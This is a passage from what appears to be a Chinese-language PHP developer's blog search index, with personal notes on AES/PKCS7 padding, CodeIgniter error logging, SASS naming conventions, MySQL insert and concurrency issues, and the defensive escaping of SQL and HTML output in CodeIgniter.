encode\nPS:[Base64 - 維基百科，自由的百科全書](https://zh.wikipedia.org/wiki/Base64)，原因為何我也不確定，目前猜測可能是怕放在 url 上面??\n\n這時候內容會是`簽章`+ `.(間隔符號)`+`內容`\n出來的時候我們會用 AES 加密\n這時候因為是 binary，所以還會做 Base64(也可以用自己去換一些符號)\n\nAPP 端接收到要做檢查\n首先解 base64 url decode~~(或自訂反解 fucntion)~~\n去做 AES 解密\n這時候會是 binary(但是 PHP 出來是 string?) 這邊可能還要確認\n我們要再做 base64 url decode\n\n> 這邊講詳細一點\n> `簽章`+ `.(間隔符號)`+`內容`\n> 這時候可以做反簽章\n> 簽章跟內容是分開獨立各做`base64 url decode`\n\n內容解出來，在自己做 `hash_hmac`\n可以得到自己`簽章內容`\n\n這時候跟風包給的簽章內容有沒有一致?\n一致就是這個資料沒有被串改\n\n**簽章講完了，重頭戲要開始了**\n\n## 為什麼送到 Android 有奇怪的空白字元??(PKCS7)\n\n是 PKCS7 的關係\n\n簡單說明一下，因為 AES 加密必須是 16 倍數(應該= =|||，是聽到這個原因)\n當你資料沒有給到一定的數字，它會自動幫你補\n\n我們當下用 workaround 方式先去解在我們資料帶`===`講好符號先去解取\n但最佳解不是這樣做\n\n- [关于 mcrypt_encrypt 和 openssl_encrypt 加密结果不一致的解决 – 继续生活](https://www.heylc.com/fuanyuopenssl.html)\n- [PHP 由 mcrypt 扩展加密改为 openssl 扩展加密|xiaolingzi's blog | 生活是多彩的 | Life is colorful](https://www.xxling.com/blog/article/3114.aspx)\n- [php 遷移 Mcrypt 至 OpenSSL 加密算法的詳細介紹（代碼示例） - 每日頭條](https://kknews.cc/zh-tw/other/9pgvlpl.html)\n- [对称加密算法的 PKCS5 和 PKCS7 填充 | Zhiwei Li](https://zhiwei.li/text/2009/05/17/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84pkcs5%E5%92%8Cpkcs7%E5%A1%AB%E5%85%85/)\n\n```php\n/**\n * PKCS7Encoder class\n *\n * 提供基于PKCS7算法的加解密接口.\n */\nclass PKCS7Encoder\n{\n\tpublic static $block_size = 32;\n\n\n\t/**\n\t* 对需要加密的明文进行填充补位\n\t* @param $text 需要进行填充补位操作的明文\n\t* @return 补齐明文字符串\n\t*/\n\tfunction encode($text)\n\t{\n\t\t$block_size = self::$block_size;\n\t\t$text_length = strlen($text);\n\t\t//计算需要填充的位数\n\t\t$amount_to_pad = $block_size - ($text_length % $block_size);\n\t\tif ( $amount_to_pad == 0 )\n\t\t\t$amount_to_pad = $block_size;\n\t\t//获得补位所用的字符\n\t\t$pad_chr = chr($amount_to_pad);\n\t\t$tmp = \"\";\n\t\tfor ( $index = 0; $index < $amount_to_pad; $index++ )\n\t\t\t$tmp .= $pad_chr;\n\t\treturn $text . $tmp;\n\t}\n\n\n\t/**\n\t* 对解密后的明文进行补位删除\n\t* @param decrypted 解密后的明文\n\t* @return 删除填充补位后的明文\n\t*/\n\tfunction decode($text)\n\t{\n\t\t$pad = ord(substr($text, -1));\n\t\tif ($pad < 1 || $pad > self::$block_size)\n\t\t\t$pad = 0;\n\t\treturn substr($text, 0, (strlen($text) - $pad));\n\t}\n}\n// ---------------------\n// 作者：qq_34089779\n// 来源：CSDN\n// 原文：https://blog.csdn.net/qq_34089779/article/details/79066961\n// 版权声明：本文为博主原创文章，转载请附上博文链接！\n```\n\n- [PKCS7 算法基于 php 的加解密 - qq_34089779 的博客 - CSDN 博客](https://blog.csdn.net/qq_34089779/article/details/79066961)\n\n```php\nfunction PKCS7Padding($str, $block_size) {\n    $padding_char = $block_size - (strlen($str) % $block_size);\n    $padding_str = str_repeat(chr($padding_char),$padding_char);\n    return $str.$padding_str;\n}\nfunction PKCS7UnPadding($str) {\n    $char=substr($str,-1,1);\n    $num=ord($char);\n    if($num>0 && $num <= strlen($str)) {\n        $str = substr($str, 0, -1 * $num);\n    }\n    return $str;\n}\n```\n\n- [PHP 加解密算法使用 openssl 替换 mcrypt 扩展 | 牛牛大作栈](http://www.imsry.cn/posts/5c3bf0b6.html) {% asset_link web1.png 備份圖 %}\n  有驗證上面兩個函示，得出來結果都是相等的。\n  但注意，在上面 echo 出來，網頁或 log 上面都不會有字元\n  要看 var_dump 會比較準\n\n* [AES/CBC/PKCS5Padding 的 PHP 实现 - luoxiaojun1992 的个人空间 - OSCHINA](https://my.oschina.net/luoxiaojun1992/blog/883123)\n\n主要的填充算法有填充 NUL(\"0\") 和 PKCS7，Mcrypt 默認使用的 NUL(\"0\") 填充算法，當前已不被推薦，OpenSSL 則默認模式使用 PKCS7 對數據進行填充並對加密後的數據進行了 base64encode 編碼，所以建議開發中使用 PKCS7 對待加密數據進行填充，已保證通用性（alipay sdk 中雖然使用了 Mcrypt 加密簇，但使用 PKCS7 算法對數據進行了填充，這樣在一定程度上親和了 OpenSSL 加密算法）。\n\n原文網址：https://kknews.cc/zh-tw/other/9pgvlpl.html\n\n[php 如何 openssl_encrypt 加密解密 - 个人文章 - SegmentFault 思否](https://segmentfault.com/a/1190000016804661)\n有說`OPENSSL_ZERO_PADDING`會自動填充\n但測試結果沒有效果 OPENSSL_RAW_DATA 方式【会用 PKCS#7 进行补位】\n\n## 簡單說我對簽章的定義\n\n{% asset_img https://upload.wikimedia.org/wikipedia/commons/thumb/6/66/Digital_Signature_diagram_zh-CN.svg/1280px-Digital_Signature_diagram_zh-CN.svg.png 簽章流程 %}\n\n簽章主要目的加密，而是防止資料有被串改\n\nebc 是沒有 iv 的，cbc 是有 iv 的\n有用 iv 會比較安全，但是 iv 長度是有限制的\n[lyhiving/aes: 兼容 php、js、JAVA 的 AES 加密](https://github.com/lyhiving/aes)\n詳細的我就沒研究\n\n當天跟所有公司留到半夜 4:30 回去，也許這就是技術債!!!\n希望不要有上班回家的時候不要再看到太陽出來了\n\n題外小記\nmatrix 做翻書效果，搭配 向量矩陣 和[缓动函数速查表](https://www.xuanfengge.com/easeing/easeing/)\n有很好展示效果\n\n[jlmakes/rematrix: Matrix transformations made easy.](https://github.com/jlmakes/rematrix)\n[The CSS3 Matrix Construction Set](http://www.useragentman.com/matrix/#E4UwziAuBCCumQPYDsBMBeASuKACAYosALYBkAZsIsQAwAe6NFVtAno6UvegMwAcAFk6Ia7AIwA2IZWpjxNJkjEMeAicLnpU25tVQMxC4fvQBWAOymAdAE47NiTYF9UA1GJvHxAnsJ4MfXyQedlVUUgATRB4AEXRIYFgQUgBLCLF0AGVYACNiFMhUiIxsCEKAC0hiABsAYRRIEGRIdAAeAAcAPgAVcpSwXH7cAENcHOrEAGMAa1wQapBiJsgrVoB6LoAoUkmwMHrm5fQ1gCpN3BOCEHncSmvcJDmIgpHkVlxEcgfykFwwSFYCwGOXmiAA7lZzic1ptNqc5sgwLBQCNqtVvr95otlgN-oCQBExqCwbhYBAxkQIiBgABaHKIOgXGFWcZTaYAGlwAGIAObANK4ADe51wovpdBpYBSAC8UsgeQAuCnAKm08UAbk2AF9YfDer9EDkAFYgSaQInkIi-F5DBLDRGWkgEpmbLmIMRCkVi4YzPmIWDICJKrnkciTcOTTU6uGXfUfY2m83DciNYCDc3lYbA67IB7Ae1gR1LQnQ12IVCe0Xe31UANB7kRyahqO6y71YjEFB-AFA25ECmMw0ms1gKwulkTGaVquW5qSmUgJVyn78yBR3Ct3C1TKZPtpyA-XB8gWl3n8wnCqtjH3TP11pXI6oACgARCliMMeeA1jkb3fA1YPIpOQL4AJS4KA7QgMM5pgJMVBorgNBIbgYJ9I0mpXj8KQ8pUSp8Ao7R0JhVbtIgUqQCkKBKqA1QwSkABuIAkaKiBMcA5ATGCSp9BEVLIC2RQ8FkuT5OaAAS3QALIADKvIS26ZEUAjoLU9qTPMRSmOgkwTBARQSDpekgEAA)\n[演算法筆記 - Linear Function](http://www.csie.ntnu.edu.tw/~u91029/LinearFunction.html)\n","tags":["aes"],"categories":["PHP"]},{"title":"Laravel 新手實作 Vue.js 簡單使用方法 和 yield 應用","url":"%2Fblog%2F2019%2F06%2F05%2FLaravel-%E6%96%B0%E6%89%8B%E5%AF%A6%E4%BD%9C-Vue-js-%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95-%E5%92%8C-yield-%E6%87%89%E7%94%A8%2F","content":"\n今天去聽 Laravel 和 Vue.js 研討會\n身為學一點 Vue.js 根想學 Laravel\n這場真的還滿適合我的\n就報名!!\n當天回去就寫這篇\n\n<!--more-->\n\n首先，今天講了很多 Laravel 的 balde 應用\n講者從 View 的 balde 開始講\n特別獎到 `yield` 預留一個空位意思\n之前有一些程式會有這個關鍵字，都沒去了解(跪鍵盤\n\n可以套用 section 進去，當場示範完成 [LaraGirls|專屬女性的程式學習社群](https://www.laragirls.org/) 官網\n首先，他找 Boostrap 相似版面完成 HTML 排版\n然後 router , view (搭配 yield, extends ,section, foreach)\n一小時內完成網站排版(mockup)\n\n講者大大還說，透過這個可以做出簡單的 mockup\n在跟使用者談需求的時候\n非常方便!!!!\n\n接下來就是 Vue.js\n\n1. vue.js 已經包到 Laravel，之接呼叫 component 就可以了(首先載入 app.js 跟 設定 id=app)\n2. 前後端分離\n\n有空詳細寫\n\n這個跟 Codeigniter 比起來 View 地方差很多\n不過 header 選單如何做 active 部份\n有 google 查了一下\n\n- [php - Setting Bootstrap navbar active class in Laravel 5 - Stack Overflow](https://stackoverflow.com/questions/29837555/setting-bootstrap-navbar-active-class-in-laravel-5)\n- [Laravel: How to Make Menu Item Active by URL/Route – Quick Admin Panel](https://quickadminpanel.com/blog/laravel-how-to-make-menu-item-active-by-urlroute/)\n- [lavary/laravel-menu: A quick way to create menus in Laravel 5](https://github.com/lavary/laravel-menu)\n\n研討會投影片和程式內容\n\n- [在 Laravel 裡玩切版](https://www.slideshare.net/shengyou/layout-with-blade-and-vue/)\n  [laravel-dojo/20190604-laragirls-layout-with-blade-and-vue-1: 受邀至 LaraGirls 示範如何使用在 Laravel 裡以三種不同的方式做切版開發。此為現場實作的程式碼範例裡，Laravel 的部份。](https://github.com/laravel-dojo/20190604-laragirls-layout-with-blade-and-vue-1)\n- [laravel-dojo/20190604-laragirls-layout-with-blade-and-vue-2: 受邀至 LaraGirls 示範如何使用在 Laravel 裡以三種不同的方式做切版開發。此為現場實作的程式碼範例裡，Vue 的部份。](https://github.com/laravel-dojo/20190604-laragirls-layout-with-blade-and-vue-2)\n","tags":["laravel"],"categories":["Laravel"]},{"title":"PHP CI 框架不會記錄 ERROR 到 nginx log裡解決方案","url":"%2Fblog%2F2019%2F06%2F03%2FPHP-CI-%E6%A1%86%E6%9E%B6%E4%B8%8D%E6%9C%83%E8%A8%98%E9%8C%84-ERROR-%E5%88%B0-nginx-log%E8%A3%A1%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%A1%88%2F","content":"\n[PHP-FPM 打開 error log 方法 | 程式狂想筆記](https://malagege.github.io/blog/2019/05/22/PHP-FPM-%E6%89%93%E9%96%8B-error-log-%E6%96%B9%E6%B3%95/)\n之前紀錄 PHP-FPM ERROR 錯誤方法\n但今天發現公司的 CI 還是沒有紀錄 LOG\n追查了一下原因，原來 CI 有做 `set_error_handler` ...\n這邊詳細記錄這個雷\n\n<!--more-->\n\n事情是這樣的\nn 個月前，我們公司用了 CI 做開發\n由於第一次把 CI 放在 docker container 下\n結果查看 log 的時候竟然沒有紀錄 log ...\n當初以為是 docker 或 php-fpm 設定的問題\n或者 display_error 或 error_reporting 問題\n\n但今天發現是 CI 問題!!!!\n\n## 發現事情不單純\n\nCI 故意寫錯 log，但是 nginx docker 上面竟然就是沒有 log\n但發現直連 `test.php`(非用 CI 框架)正常\n這時候我就測試在 `index.php` 幾行都會記入到 nginx log\n但發現放在 `index.php` 最下面錯誤不會出來\n\n```php\n<?php\n...\nrequire_once BASEPATH.'core/CodeIgniter.php';\n```\n\n這時候我覺得 Codeigniter 有鬼\n\n有猜到是 Codeigniter.php 裡面的這三行搞鬼\n注解掉就可以用了\n\n```php\n<?php\n\tset_error_handler('_error_handler');\n\tset_exception_handler('_exception_handler');\n    register_shutdown_function('_shutdown_handler');\n```\n\n有找一下，set_error_handler\n\n> It is important to remember that the standard PHP error handler is completely bypassed for the error types specified by error_types unless the callback function returns FALSE. error_reporting() settings will have no effect and your error handler will be called regardless - however you are still able to read the current value of error_reporting and act appropriately. Of particular note is that this value will be 0 if the statement that caused the error was prepended by the @ error-control operator.\n> [PHP: set_error_handler - Manual](https://www.php.net/manual/en/function.set-error-handler.php)\n> 簡單說就是錯誤，會執行 set_error_handler\n> 但是預設錯誤的 function 不會執行\n> 除非裡面 return false(目前還沒測差過)\n\n不過 CI 沒有記錄 php stderr ，所以導致 CI 沒有紀錄 (PS: 這個是我的猜測)\n[简述 PHP 的标准输入与输出 | Laravel China 社区](https://learnku.com/articles/5765/brief-introduction-of-standard-input-and-output-of-php)\n目前猜測可能寫 stderr 會出現到 log 上面\n\n**2019-06-04 小記**\n今天公司小測\n使用`file_put_contents('php://stderr','this is a log');`\n會被 php-fpm 記錄起來，但是 nginx 好像不會收到\n目前猜測可能不是從 php-fpm 寫進去...\n所以才不會記錄(?)\n但已經能解決自行寫入 log 問題\n正常接到 php-fpm 的 stderr (nginx docker)\n\n```\n  thrown in /usr/local/nginx/html/index.php on line 364\" while reading response header from upstream, client: 10.56.158.42, server: localhost, request: \"GET / HTTP/1.1\", upstream: \"fastcgi://192.168.112.8:9000\", host: \"10.56.159.10\",\n10.56.158.42 - - [03/Jun/2019:09:42:46 +0000] \"GET / HTTP/1.1\" 200 238 \"-\" \"PostmanRuntime/7.13.0\",\n2019/06/03 09:43:36 [error] 6#6: *46 FastCGI sent in stderr: \"PHP message: PHP Fatal error:  Uncaught Error: Call to undefined function dffffffffffffff() in /usr/local/nginx/html/index.php:364,\u0002\n```\n\nerror_log('this is a log .',0);\n也能做到一樣的事情\n但一樣 nginx 那一邊不會出現 log ，只會在 nginx\n不知道為什麼...\n[PHP: error_log - Manual](https://www.php.net/manual/en/function.error-log.php)\n3 選項可以寫路徑，但感覺會沒有權限寫的感覺\n有空試試\n\nCI 有做 set_error_handler\nhttp code 500 錯誤\n所以可能開啟`display_error,1`時候\nhttp code 碼會是 200\n\n> When display_errors is on it will return 200 always.\n> When display_errors is off it will return 500.\n> [Apache/PHP returns HTTP Status Code 200 on error pages - Stack Overflow](https://stackoverflow.com/questions/28972933/apache-php-returns-http-status-code-200-on-error-pages)\n\n就先研究到這邊\n[redirect php-fpm output to nginx's error log](https://gist.github.com/joerx/87c6755023d2817154b41264311fcfe6)\n\n---\n\n最後在[CI 框架不写 Nginx 错误日志的原因分析及解决办法 - zhang197093 的博客 - CSDN 博客](https://blog.csdn.net/zhang197093/article/details/75215812)\n看到真的有人遇到一樣的問題\n\n這個太雷了 冏!!!\n\n其他參考\n\n[PHP: 预定义常量 - Manual](https://www.php.net/manual/zh/errorfunc.constants.php)\n[PHP: restore_error_handler - Manual](https://www.php.net/manual/zh/function.restore-error-handler.php)\n[CI 框架不写 Nginx 错误日志的原因分析及解决办法 - zhang197093 的博客 - CSDN 博客](https://blog.csdn.net/zhang197093/article/details/75215812)\n","tags":["nginx"],"categories":["PHP"]},{"title":"SASS 學習小記","url":"%2Fblog%2F2019%2F06%2F02%2FSASS-%E5%AD%B8%E7%BF%92%E5%B0%8F%E8%A8%98%2F","content":"\n最近上課 SASS\n這邊記入我可能會忘記的東西\n\n<!--more-->\n\n## SMACSS\n\n重點 擴充、模組化\n\n- Base\n  不要下 class ，可以用基本樣式\n  這個地方可參考[Pure](https://purecss.io/)設計方法\n- Layout\n  l-grid,l-list\n  (建議不要用語意命名)\n  每一頁會用到的 class\n- module\n  每頁重複會用到的元件。如按鈕(.btn)\n  錯誤範例如下\n\n```\n.btn\n.btn-blue\n.btn-blue-large\n```\n\n正確比要適合用 bootstrap 命名\n\n```\n.btn\n.btn-primary\n```\n\n> 增加子模組\n> .l-grid\n> .l-grid h2 ==> .l-grid_title\n> .l-grid ul ==> .l-grid_list\n\n簡單我對 SMCASS 總結，就是做`程式切分結構`\n可參考如下網站\n[鐵人賽 20 - Sass 資料夾結構 | 卡斯伯 Blog - 前端，沒有極限](https://wcc723.github.io/css/2016/12/20/sass-folder/)\n\n1. base\n2. layout\n3. module\n   ------以下可看專案大小決定\n4. theme\n\n...\n\n更多可參考這篇[Sass 7-1 Pattern](https://gist.github.com/rveitch/84cea9650092119527bc)\n\n## OOCSS\n\n1. 結構與樣式分離\n2. 容器與內容分離\n\n首先，還是先分清楚什麼是結構?什麼事容器?\n\n### 1.結構、樣式\n\n**結構**\nEX: Bootstrap .btn\n.btn 這個就是結構\n\n**樣式**\n.btn-lg .btn-primary\n這些就是樣式\n\n### 2.容器、內容\n\n**容器**\nEX: Bootstrap 的.container , col-3\n簡單就是排版、網格\n\n**內容**\nEX: Bootstrap 的 .pagination .list-group\n\n### OOCSS 好處\n\n1. 增加使用性(reuse)\n2. 減少 code\n\n需要注意的事情!!\n`樣式`CSS 不要跟 `結構`一起寫!!!!\n**錯誤範例**EX: .col-3 .btn\n這樣會失去彈性\n\n容器與內容可以玩一下裡面的排版\n正常容器裡面可以放`容器`和`內容`\n完一下可以大概知道這兩個差異\n[LayoutIt! - Interface Builder for CSS Grid and Bootstrap](https://www.layoutit.com/cn)\n\n### 我們可能有寫過的 OOCSS\n\n以前我看到有些網站的 CSS 是這樣寫的\nex: .text-left, .mt1, .mt2, .mt3 ...\n覺得這樣寫也不錯，後來我有些網站也有這樣寫\n\n### OOCSS 會有什麼缺點\n\n不好的話，html 的 class 東西可能會越來越多\n這時候我覺得可以看情況是不是需要用 module\n\n## BEM\n\nBEM 的意思是區塊（Block）、元素（Element）、修飾符（Modifier）\n\n### Block\n\n這邊覺得簡單講就是一個 module(模組)\nEX: .card,.list\\_\\_item\n\n`__`這邊規定說只能放一個，能放多個\n\n**這邊有一個重點**\n\n### Element\n\n一個 Block 可以放多個 Element。我簡單說他是`子模組`。\n在使用 Element\n\n.list\\_\\_item\\_\\_img\n.list\\_\\_item\\_\\_title\n.list\\_\\_item\\_\\_content\n\n### Modifier\n\n簡單就是說(子)模組狀態\n正常會在 Modifier 放`--`\n\n### 符號\\_\\_跟-- 沒有強制規定\n\nBEM 符號可以看公司規定做調整\n最近剛好看到巴哈論壇他們的 CSS 好像是這樣設計的\n但他們符號沒有跟 BEM 用一樣\n\n## 設計模式總結\n\n最後紀錄三個設計 CSS 設計模式\n設計不一定要同時用三個\n選擇上可以參考上面三個設計\n\n## 其他紀錄\n\n### CSS 盡量不要超過 3 層\n\nEX: .header nav ul li a\n\n這樣太多層了\n\n可以改成 nav li a\n\n原因效能上也會有關係，管理上也比較麻煩\n\n### 為什麼有些.container 裡面會包.wrap?\n\n有時候.wrap 裡面某些元件可能需要做致中\n可以搭配.wrap 操作置中\n會比較方便\n\n### 盡量不要寫 a.logo\n\n.header .logo a\n.header a.logo\n\n寫 CSS 不要指定 html tag 跟 class 連在一起\n這樣有失彈性\n\n這上面還有一個問題\nlogo 不可能出現 header 上面\n所以可以用\n\n### SASS 使用變數技巧\n\n不要用`語意`\n錯誤範例 EX: .booksList,.carsList\n這樣明明這些都是一樣東西\n但每頁應該可以套同一個 CSS class\n如: .list, .l-list(可以家前綴)\n\n使用變數技巧\n\n```sass\n$red: red;\n$body-color: $red;\n```\n\n這樣網站在改顏色的時候非常好調整\n可以參考 bootstrap 原碼\n[bootstrap/\\_variables.scss at master · twbs/bootstrap](https://github.com/twbs/bootstrap/blob/master/scss/_variables.scss)\n\n**語意的部分還是交給 html 吧**\n\nbackimage 圖片沒有重複使用，也不要用成變數\n除非有特別關係(通常應該不會)\n\n利用變數技巧一次產生多個 class 方法\n[bootstrap/\\_utilities.scss at master · twbs/bootstrap](https://github.com/twbs/bootstrap/blob/master/scss/_utilities.scss)\n\n## 結構辨別的種類\n\n1. 佈局 layout、頁面 page (只出現一處)\n2. 工具 helper、utilities\n3. 模組 module (出現兩處以上)\n4. 容器 container、grid\n\n## 其他寫 CSS 可能需要注意的事情\n\n### float 做響應式可能需要注意的事\n\n.fl{\nfloat:left;\n}\n\n但需要注意到手機全版建議取消 float\n\n### 少指定 width,height 數值\n\n使用格線系統具有彈性\n\n### 其他使用 SASS 技巧\n\n#### 容器單一寫 CSS\n\n錯誤範例\nex:\n.col-3 .col-12\n.col-12 .img\n\n正確寫法\n\n.col-12\n.img\n\n####前綴可以對應放置 SASS 資料夾\n.p-about 放在 page\n.l-list 放在 layout\n再找 CSS 位置會特別直覺\n\n#### 使用 page 做每頁分類\n\n不要寫出多份 SASS(產生多個 css ex:about.css home.css)\n只需要寫一個 SASS(產生一個 css ex:all.css)\n這個好處在拆分 css 模組化會比較有幫助\n\n#### page module 比較\n\npage vs module\npage 只有當頁有用到\nmodule 有很多頁會用到\n\n#### 不知道歸類方法\n\n在不知道要放在哪邊情況下\n可以先放在`inbox`資料夾\n方便以後知道後再做移轉\n\n#### 最後思考\n\n是否能將 Layout 與 Page 重構為 module?\n\n先記錄這樣...，我還有格線系統沒紀錄 orz\n","tags":["css"],"categories":["SASS"]},{"title":"MySQL(MariaDB) insert有關做相同表會遇到問題小記","url":"%2Fblog%2F2019%2F06%2F02%2FMySQL-MariaDB-insert%E6%9C%89%E9%97%9C%E5%81%9A%E7%9B%B8%E5%90%8C%E8%A1%A8%E6%9C%83%E9%81%87%E5%88%B0%E5%95%8F%E9%A1%8C%E5%B0%8F%E8%A8%98%2F","content":"\n最近做 INSERT 很簡單語法\n但竟然出錯\n印象中 DB2 以前這樣下沒有這個問題\n錯誤訊息如下：\n`Table 'test' is specified twice, both as a target for 'INSERT' and as a separate source for data`\n`You can't specify target table 'basic_data' for update in FROM clause`\nex:\n\n```sql\nINSERT INTO data_waktu_vaksinasi (id_binatang, id_vaksin, tanggal_vaksin, status_vaksin) VALUES\n    (1, 1, (SELECT DATE_ADD(max(tanggal_vaksin), INTERVAL 1 YEAR)) FROM data_waktu_vaksinasi, 'belum')\n```\n\n<!--more-->\n\n爬了一些網站有找到解法\n[解决 mysql 不能修改（You can't specify target table 'basic_data' for update in FROM clause） - winter13292 的专栏 - CSDN 博客](https://blog.csdn.net/winter13292/article/details/8628953)\n[mysql - table is specified twice both as a target for INSERT and as separate source of data - Stack Overflow](https://stackoverflow.com/questions/34839842/table-is-specified-twice-both-as-a-target-for-insert-and-as-separate-source-of-d)\n[1093 Error in MySQL table is specified twice - Stack Overflow](https://stackoverflow.com/questions/47165521/1093-error-in-mysql-table-is-specified-twice?rq=1)\n\n```sql\nINSERT INTO data_waktu_vaksinasi (id_binatang, id_vaksin, tanggal_vaksin, status_vaksin)\n     SELECT 1, 1, DATE_ADD(max(tanggal_vaksin), INTERVAL 1 YEAR), 'belum'\n     FROM data_waktu_vaksinasi;\n```\n\n或外面包一個 `SELECT`\n[解决 mysql 不能修改（You can't specify target table 'basic_data' for update in FROM clause） - winter13292 的专栏 - CSDN 博客](https://blog.csdn.net/winter13292/article/details/8628953)\n\n也有看到 join 方式解決\n[mysql: you can't specify target table 问题解决 - weixin_42608550 的博客 - CSDN 博客](https://blog.csdn.net/weixin_42608550/article/details/89644418)\n\n其他小記\n[如何去掉数据库重复记录并且只保留一条记录 - Java 高知 - CSDN 博客](https://blog.csdn.net/tjcyjd/article/details/8950621)\n","tags":["mysql"],"categories":["MySQL"]},{"title":"MySQL 高併發問題解決小記","url":"%2Fblog%2F2019%2F06%2F01%2FMySQL-%E9%AB%98%E4%BD%B5%E7%99%BC%E5%95%8F%E9%A1%8C%E8%A7%A3%E6%B1%BA%E5%B0%8F%E8%A8%98%2F","content":"\n小記...，有時間補\n\n<!--more-->\n\n# 設計資料表 unique\n\n這個是我想的，不過網路上感覺很少寫用這個方法\n但還是有找到少數人有在討論\n好像滿可行的\n\n用 DB unique 可以預防同時資料問題\n或者有限制 enum=[1,2,3]\n每次資料進來可預防這個問題\n但是做刪除，在加入可能就比較麻煩\n\n# 鎖表\n\nselect .... for update;\n\n待研究\n\n# redis\n\n網路爬到有用 redis 解決，有時間在理解\n[使用 Redis SETNX 命令实现分布式锁 - Leo 的博客 - CSDN 博客](https://blog.csdn.net/lihao21/article/details/49104695)\n\n[高并发场景下数据重复插入的问题 - LEON 的博客 - CSDN 博客](https://blog.csdn.net/qq_28018283/article/details/80241090)\n[如何去掉数据库重复记录并且只保留一条记录 - Java 高知 - CSDN 博客](https://blog.csdn.net/tjcyjd/article/details/8950621)\n[高并发时，进行 insert 操作出现重复记录问题分析 - hansam 的专栏 - CSDN 博客](https://blog.csdn.net/u012721013/article/details/64451644)\n[java 解决分布式环境中 高并发环境下数据插入重复问题 - 天才白痴梦 - CSDN 博客](https://blog.csdn.net/qq_22956867/article/details/72529144)\n[并发写数据库如何避免重复数据-CSDN 论坛](https://bbs.csdn.net/topics/391861174)\n[如何用DB抗住大量读写的业务 – fishermartyn.github.io](https://fishermartyn.github.io/blog/High-traffic-DB-system/)\n[处理高并发情况下的DB插入 - isWTF's blog](https://blog.iswtf.com/article.php?id=1353)","tags":["lock"],"categories":["MySQL"]},{"title":"MySQLnd 小記","url":"%2Fblog%2F2019%2F06%2F01%2FMySQLnd-%E5%B0%8F%E8%A8%98%2F","content":"\n小記\n有空實驗，再回去補實做\n\n<!--more-->\n\n[php - How to know if MySQLnd is the active driver? - Stack Overflow](https://stackoverflow.com/questions/1475701/how-to-know-if-mysqlnd-is-the-active-driver)\n[Advanced Read/Write Splitting with PHP’s MySQLnd](https://www.engineyard.com/blog/advanced-read-write-splitting-with-phps-mysqlnd)\n[mysqlnd 彙整 - Joe Horn 的啟示錄](https://www.joehorn.idv.tw/tag/mysqlnd/)\n[《第 28 天》MySql 讀寫分離，及資料庫高可用負載均衡的實現 - 每日頭條](https://kknews.cc/zh-tw/other/j5gmg6.html)\n[【mysql 读写分离】10 分钟了解读写分离的作用 - 赖德发的博客 - CSDN 博客](https://blog.csdn.net/u013421629/article/details/78793966)\n[mysql 叢集技術：主從複製，讀寫分離 | 程式前沿](https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/535088/)\n[bitnami-docker-mysql/docker-compose-replication.yml at master · bitnami/bitnami-docker-mysql](https://github.com/bitnami/bitnami-docker-mysql/blob/master/docker-compose-replication.yml)\n\ndocker 實做 Mysql master salve\n[Mysql Master/Slave Replication With Docker · Issue #1 · Junnplus/blog](https://github.com/Junnplus/blog/issues/1)\n\n其他小記\n[開源內網 DNS 服務器軟件介紹 - 台部落](https://www.twblogs.net/a/5c015fcdbd9eee7aec4eb87e)\n\n**2020-06-13**\n\n最近開始寫 Java\nJDBC 可設定 master slave\n[MySQL :: MySQL Connector/J 5.1 Developer Guide :: 8.3 Configuring Master/Slave Replication with Connector/J](https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-master-slave-replication-connection.html)\n\n[spring - Mysql master/slave replication .Connect to master even for read queries? (does Driver \"ping\" master before going to slave?) - Stack Overflow](https://stackoverflow.com/questions/22495722/mysql-master-slave-replication-connect-to-master-even-for-read-queries-does-d)\n\n[讨论一下基于Master-Slave数据库模式的J2EE开发的框架选择 - Hibernate - Java - ITeye论坛](https://www.iteye.com/topic/143714)"},{"title":"Codeigniter 安全性小記","url":"%2Fblog%2F2019%2F06%2F01%2FCodeigniter-%E5%AE%89%E5%85%A8%E6%80%A7%E5%B0%8F%E8%A8%98%2F","content":"\n最近專案由於有 QA 團隊檢查安全性\n所以這邊紀錄一下最近專案用 Codeigniter\n上一篇有紀錄到一些安全性 [CSRF , SSRF , XSS 有關網頁安全小記 | 程式狂想筆記](https://malagege.github.io/blog/2019/05/26/CSRF-SSRF-XSS%E6%9C%89%E9%97%9C%E7%B6%B2%E9%A0%81%E5%AE%89%E5%85%A8%E5%B0%8F%E8%A8%98/)\n\n<!--more-->\n\n## SQL 需要注意安全性問題\n\n首先，講一下 SQL INJECTION\n假如要放 SQL 進去查詢，但是複雜的功能平常不可能用 bind 用 `?` 去套\n所以再用 變數串 SQL 的時候可能就會有危險的問題，但是不能用 bind\n\n這時候需要加 `escape` 或 `escape_str`\n原始碼可以參考這個[CodeIgniter/DB_driver.php at 7ec458b45316b9f270e1e03de498244f71c605ea · bcit-ci/CodeIgniter](https://github.com/bcit-ci/CodeIgniter/blob/7ec458b45316b9f270e1e03de498244f71c605ea/system/database/DB_driver.php#L1037)\n`$str = array_map(array(&$this, 'escape'), $str);`\nPHP 的 array function 的運用真的 千變萬化\n\n**首先講一下 escape 的小雷**\n看了一下 Code\n想說這兩個功能都一樣\n不過`escape`接到 string 型態\n外面會自動加`'`單引號\n雖然不知道為什麼\n所以為什麼`limit ?`不能用 bind\n原因可能是 escape 會有問題(會變成 limit '2')\n所以在用的時候需要小心\n\n## XSS 小心\n\n常常在網路上看到，通常都是用 JS 攻擊\n所以需要做 XSS 過濾\n當然輸入要過濾<`script`>\n輸出的是要做`htmlspecialchar`\nCodeigniter 沒有現代化框架好用東西，如`{{ var_str }}`\n但是還是有好用的工具，如 html_escape\n相關程式原碼 [CodeIgniter/Common.php at 07cb9fd45f94d928c0f6dcf73f702808e1e03f62 · bcit-ci/CodeIgniter](https://github.com/bcit-ci/CodeIgniter/blob/07cb9fd45f94d928c0f6dcf73f702808e1e03f62/system/core/Common.php#L748)\n使用上除了可以塞 string 外 他還可以塞 array\n會把所有內容做過濾\n\n`xss_clean()`\n可以過濾`<script>`\n但是注意！！這個不是在過濾 HTML tag(ex: <`img`>,<`a`>)\n\n`$data = $this->security->xss_clean($data);`\n\n當然 img 也會有這個問題\n如這篇 [CheatSheetSeries/Cross_Site_Scripting_Prevention_Cheat_Sheet.md at master · 